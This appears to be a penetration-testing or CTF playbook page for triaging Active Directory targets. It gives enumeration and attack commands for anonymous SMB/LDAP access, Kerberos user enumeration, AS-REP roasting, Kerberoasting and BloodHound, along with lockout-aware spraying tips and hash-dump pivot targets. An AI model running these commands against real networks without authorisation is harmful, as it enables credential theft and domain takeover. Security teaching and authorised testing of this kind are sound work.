# Archetype: Active Directory / Windows Target

**Match if you see:** Ports 88, 389, 445, 464, 3268, 5985 open. Windows
banners. NTLM challenges in HTTP responses.

This is the densest archetype — full coverage in
`knowledge-base/checklists/ad-attack-checklist.md` and
`knowledge-base/tools/ad-abuse-commands.md`. This file is the **fast triage**.

## Fast checks (≤ 10 min)

```bash
# 1) Domain identification
nxc smb target                                          # domain, hostname, OS
ldapsearch -x -H ldap://target -s base namingcontexts
rpcclient -U "" -N target -c "lsaquery"

# 2) Anonymous SMB
smbclient -L //target/ -N
smbmap -H target -u '' -p ''
nxc smb target -u '' -p '' --shares

# 3) Null/anon LDAP
ldapsearch -x -H ldap://target -b "DC=domain,DC=local" '(objectClass=user)' sAMAccountName

# 4) Username enumeration via Kerberos (NO CREDS NEEDED)
kerbrute userenum -d <domain> --dc target /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -t 50

# 5) AS-REP roastable users
GetNPUsers.py <domain>/ -dc-ip target -usersfile users.txt -no-pass

# 6) Common services
curl -sI http://target                                   # IIS / web app
nxc winrm target                                         # WinRM open?
nxc rdp target                                           # RDP open?
```

## With ANY credential

```bash
# Validate
nxc smb target -u <user> -p <pass>
nxc smb target -u <user> -p <pass> --shares
nxc smb target -u <user> -p <pass> --users

# Kerberoasting
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip target -request

# BloodHound (mandatory for anything beyond user.txt)
bloodhound-python -u <user> -p <pass> -d <domain> -ns target -c All
# Then load into BloodHound, find shortest path to DA
# See: knowledge-base/checklists/bloodhound-edge-to-action.md
```

## Routing

- **Need to roast?** → `playbooks/ad-foothold-to-domain-admin.md`
- **Need RBCD?** → `playbooks/ad-rbcd-privesc.md`
- **AD CS / shadow creds?** → `playbooks/adcs-and-shadow-creds.md`
- **Specific tool syntax?** → `knowledge-base/tools/ad-abuse-commands.md`

## Common pitfalls

1. **Forgetting time sync** — Kerberos breaks if your clock is >5 min off.
   `sudo ntpdate target` or `sudo rdate -n target`.
2. **Skipping anonymous LDAP/SMB** — even on hardened boxes, *some* anonymous
   read survives.
3. **Not adding the domain to /etc/hosts** — many tools need both IP and FQDN.
4. **Spraying entire rockyou** — AD has account lockout. Use 3-5 passwords
   max per spray pass, then back off.
5. **Ignoring AS-REP roasting** — it's free if any user has DONT_REQUIRE_PREAUTH,
   no creds needed, often forgotten.

## Pivot targets

- DC `NTDS.dit` (full hash dump) — via DCSync, secretsdump
- Service accounts with high privilege (Kerberoast)
- SYSVOL `Groups.xml` (legacy GPP password leaks)
- LAPS-managed local admin password (if you can read `ms-mcs-AdmPwd`)
